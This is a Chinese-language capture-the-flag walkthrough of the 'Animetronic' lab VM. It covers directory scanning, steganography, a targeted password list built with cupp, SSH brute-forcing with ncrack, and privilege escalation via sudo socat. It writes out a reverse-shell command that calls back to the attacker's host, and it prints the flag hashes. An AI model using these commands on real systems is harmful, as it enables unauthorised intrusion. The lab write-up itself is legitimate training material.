# Animetronic

:::note

[Linux VM] [Tested on VirtualBox] created by || ziyos

⏲️ Release Date // 2023-12-11

✔️ MD5 // 30b3135e2016d3ae1b0d1c086a714ae9

☠ Root // 27

💀 User // 26

📝Notes //
The server administrator assigned you to hack this server .So don't disappoint him.This server is easy , just do not give up.

:::

## 靶机启动

靶机地址：`192.168.56.119`

## web 服务探测

![access /](img/image_20240243-174340.png)

页面为静态页面，无交互点

目录扫描：

```bash
┌─[randark@parrot]─[~]
└──╼ $feroxbuster -u http://192.168.56.119 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.119
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      314c http://192.168.56.119/img => http://192.168.56.119/img/
200      GET       52l      340w    24172c http://192.168.56.119/img/favicon.ico
301      GET        9l       28w      314c http://192.168.56.119/css => http://192.168.56.119/css/
200      GET     2761l    15370w  1300870c http://192.168.56.119/img/logo.png
301      GET        9l       28w      313c http://192.168.56.119/js => http://192.168.56.119/js/
200      GET        7l     1513w   144878c http://192.168.56.119/css/bootstrap.min.css
200      GET       42l       81w      781c http://192.168.56.119/css/animetronic.css
200      GET       52l      202w     2384c http://192.168.56.119/
301      GET        9l       28w      321c http://192.168.56.119/staffpages => http://192.168.56.119/staffpages/
200      GET      728l     3824w   287818c http://192.168.56.119/staffpages/new_employees
```

得到一条路径：`http://192.168.56.119/staffpages/new_employees`，访问返回的是 JPEG 图像数据

将其下载到本地，进行隐写分析，在图片的评论中得到：

```plaintext
page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=
```

解码，并进行上下翻转后，得到

```plaintext
leahcim_rof_egassem
```

根据信息，得到以下路径：`/staffpages/message_for_michael`

```plaintext
Hi Michael

Sorry for this complicated way of sending messages between us.
This is because I assigned a powerful hacker to try to hack
our server.

By the way, try changing your password because it is easy
to discover, as it is a mixture of your personal information
contained in this file

personal_info.txt
```

继续访问 `/staffpages/personal_info.txt`

```plaintext
name: Michael

age: 27

birth date: 19/10/1996

number of children: 3 "Ahmed - Yasser - Adam"

Hobbies: swimming
```

## 利用社工数据进行爆破

根据得到的信息，进行字典生成

```bash
┌─[randark@parrot]─[~]
└──╼ $cupp -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [Muris Kurgas | j0rgan@remote-exploit.org]
                            [Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Michael
> Surname:
> Nickname:
> Birthdate (DDMMYYYY): 19101996


> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name: Ahmed
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name:
> Company name:


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: Ahmed,Yasser,Adam,swimming
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to michael.txt, counting 12460 words.
[+] Now load your pistolero with michael.txt and shoot! Good luck!
```

然后尝试爆破 Michael 的 SSH 凭据

```bash
┌─[✗]─[randark@parrot]─[~]
└──╼ $ncrack -T5 -v -u michael -P michael.txt ssh://192.168.56.119

Starting Ncrack 0.7 (http://ncrack.org) at 2024-02-01 19:27 CST

Discovered credentials on ssh://192.168.56.119:22 'michael' 'leahcim1996'
```

## user pwned

```bash
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs michael@192.168.56.119
[20:03:59] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
Password: ***********
[20:04:02] 192.168.56.119:22: registered new host w/ db                                                                                                                                                                      manager.py:957
(local) pwncat$ back
(remote) michael@animetronic:/home/michael$ ls -lh
total 0
(remote) michael@animetronic:/home/michael$ la
.bash_history  .bash_logout  .bashrc  .cache  .profile
(remote) michael@animetronic:/home/michael$ ls -lah
total 28K
drwxr-x--- 3 michael michael 4.0K Nov 27 21:03 .
drwxr-xr-x 4 root    root    4.0K Nov 27 18:10 ..
-rw------- 1 michael michael    5 Nov 27 21:03 .bash_history
-rw-r--r-- 1 michael michael  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 michael michael 3.7K Jan  6  2022 .bashrc
drwx------ 2 michael michael 4.0K Nov 27 18:50 .cache
-rw-r--r-- 1 michael michael  807 Jan  6  2022 .profile
(remote) michael@animetronic:/home/michael$ cd ../
(remote) michael@animetronic:/home$ ls -lah
total 16K
drwxr-xr-x  4 root    root    4.0K Nov 27 18:10 .
drwxr-xr-x 19 root    root    4.0K Nov 27 09:54 ..
drwxrwxr-x  6 henry   henry   4.0K Nov 27 20:59 henry
drwxr-x---  3 michael michael 4.0K Nov 27 21:03 michael
(remote) michael@animetronic:/home$ cd henry/
(remote) michael@animetronic:/home/henry$ ls -lah
total 56K
drwxrwxr-x   6 henry henry 4.0K Nov 27 20:59 .
drwxr-xr-x   4 root  root  4.0K Nov 27 18:10 ..
-rwxrwxr-x   1 henry henry   30 Jan  5 10:08 .bash_history
-rwxrwxr-x   1 henry henry  220 Jan  6  2022 .bash_logout
-rwxrwxr-x   1 henry henry 3.7K Jan  6  2022 .bashrc
drwxrwxr-x   2 henry henry 4.0K Nov 27 10:08 .cache
drwxrwxr-x   3 henry henry 4.0K Nov 27 10:42 .local
drwxrwxr-x 402 henry henry  12K Nov 27 18:23 .new_folder
-rwxrwxr-x   1 henry henry  807 Jan  6  2022 .profile
drwxrwxr-x   2 henry henry 4.0K Nov 27 10:04 .ssh
-rwxrwxr-x   1 henry henry    0 Nov 27 18:26 .sudo_as_admin_successful
-rwxrwxr-x   1 henry henry  119 Nov 27 18:18 Note.txt
-rwxrwxr-x   1 henry henry   33 Nov 27 18:20 user.txt
(remote) michael@animetronic:/home/henry$ cat user.txt
0833990328464efff1de6cd93067cfb7
```

## 提权探测

```plaintext title="/home/henry/Note.txt"
if you need my account to do anything on the server,
you will find my password in file named

aGVucnlwYXNzd29yZC50eHQK
```

解码后的到：`henrypassword.txt`

```bash
(remote) michael@animetronic:/home/henry$ find / -type f -name henrypassword.txt 2>/dev/null
/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
```

读取文件内容

```plaintext title="/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt"
IHateWilliam
```

成功切换到 henry 账户

```bash
(local) pwncat$ connect henry@192.168.56.119
Password: ************
[20:10:19] 192.168.56.119:22: loaded known host from db                                                                                                                                                                      manager.py:957
(local) pwncat$ sessions
                                    Active Sessions
     ╷       ╷                                  ╷          ╷      ╷
  ID │ User  │ Host ID                          │ Platform │ Type │ Address
 ════╪═══════╪══════════════════════════════════╪══════════╪══════╪═══════════════════
  *1 │ henry │ fa000a0e16495f8dd261626f16b2971a │ linux    │ Ssh  │ 192.168.56.119:22
     ╵       ╵                                  ╵          ╵      ╵
(local) pwncat$ back
(remote) henry@animetronic:/home/henry$ ls -lah
total 56K
drwxrwxr-x   6 henry henry 4.0K Nov 27 20:59 .
drwxr-xr-x   4 root  root  4.0K Nov 27 18:10 ..
-rwxrwxr-x   1 henry henry   30 Jan  5 10:08 .bash_history
-rwxrwxr-x   1 henry henry  220 Jan  6  2022 .bash_logout
-rwxrwxr-x   1 henry henry 3.7K Jan  6  2022 .bashrc
drwxrwxr-x   2 henry henry 4.0K Nov 27 10:08 .cache
drwxrwxr-x   3 henry henry 4.0K Nov 27 10:42 .local
drwxrwxr-x 402 henry henry  12K Nov 27 18:23 .new_folder
-rwxrwxr-x   1 henry henry  807 Jan  6  2022 .profile
drwxrwxr-x   2 henry henry 4.0K Nov 27 10:04 .ssh
-rwxrwxr-x   1 henry henry    0 Nov 27 18:26 .sudo_as_admin_successful
-rwxrwxr-x   1 henry henry  119 Nov 27 18:18 Note.txt
-rwxrwxr-x   1 henry henry   33 Nov 27 18:20 user.txt
```

## 尝试提权

```plaintext title="sudo -l"
Matching Defaults entries for henry on animetronic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User henry may run the following commands on animetronic:
    (root) NOPASSWD: /usr/bin/socat
```

尝试借助 sudo+socat 反弹 shell

```bash
sudo /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.56.102:9999
```

成功收到回连的shell

```bash
(local) pwncat$ connect -lp 9999
[20:14:04] received connection from 192.168.56.119:51080                                                                                                                                                                         bind.py:84
[20:14:05] 192.168.56.119:51080: registered new host w/ db                                                                                                                                                                   manager.py:957
(local) pwncat$ back
(remote) root@animetronic:/home/henry# whoami
root
```

## root pwned

```bash
(remote) root@animetronic:/root# cat root.txt 
153a1b940365f46ebed28d74f142530f280a2c0a
```
